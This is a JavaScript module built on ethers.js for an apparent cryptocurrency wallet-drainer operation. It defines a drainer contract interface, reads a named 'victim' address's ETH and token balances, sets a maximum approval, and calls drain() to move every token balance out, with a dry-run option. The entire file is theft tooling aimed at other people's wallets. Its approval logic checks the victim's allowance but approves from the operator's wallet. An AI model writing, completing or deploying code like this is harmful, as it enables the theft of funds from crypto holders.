const { ethers } = require("ethers");
const { getProvider, getWallet } = require("./wallet");

const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function allowance(address,address) view returns (uint256)",
  "function approve(address,uint256) returns (bool)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
];

const DRAINER_ABI = [
  "function drain(address,address,uint256)",
  "function drainNative(address,uint256)",
];

async function getBalances(victim) {
  const provider = getProvider();
  const eth = await provider.getBalance(victim);
  return { eth: Number(eth) / 1e18 };
}

async function getTokenBalance(victim, token) {
  const provider = getProvider();
  const c = new ethers.Contract(token.address, ERC20_ABI, provider);
  const bal = await c.balanceOf(victim);
  return Number(bal) / Math.pow(10, token.decimals);
}

async function drainTokens(victim, tokens, drainerAddress, dryRun) {
  const provider = getProvider();
  const wallet = getWallet();
  const results = [];

  for (const t of tokens) {
    let bal;
    try {
      const c = new ethers.Contract(t.address, ERC20_ABI, provider);
      bal = await c.balanceOf(victim);
    } catch (e) {
      results.push({ token: t.symbol, amount: 0, status: "error: " + e.message.slice(0, 60) });
      continue;
    }
    if (bal === 0n) continue;
    const amount = Number(bal) / Math.pow(10, t.decimals);

    if (dryRun) {
      results.push({ token: t.symbol, amount, status: "dry-run" });
      continue;
    }

    // ensure approval
    const allowance = await c.allowance(victim, drainerAddress);
    if (allowance < bal) {
      const max = ethers.MaxUint256;
      const approveTx = await c.connect(wallet).approve(drainerAddress, max);
      await approveTx.wait();
    }

    const drainer = new ethers.Contract(drainerAddress, DRAINER_ABI, wallet);
    const tx = await drainer.drain(victim, t.address, bal);
    const receipt = await tx.wait();
    const gas = Number(receipt.gasUsed) * Number(receipt.gasPrice || 0) / 1e18;
    results.push({ token: t.symbol, amount, tx: receipt.hash, gas });
  }
  return results;
}

module.exports = { getBalances, getTokenBalance, drainTokens };
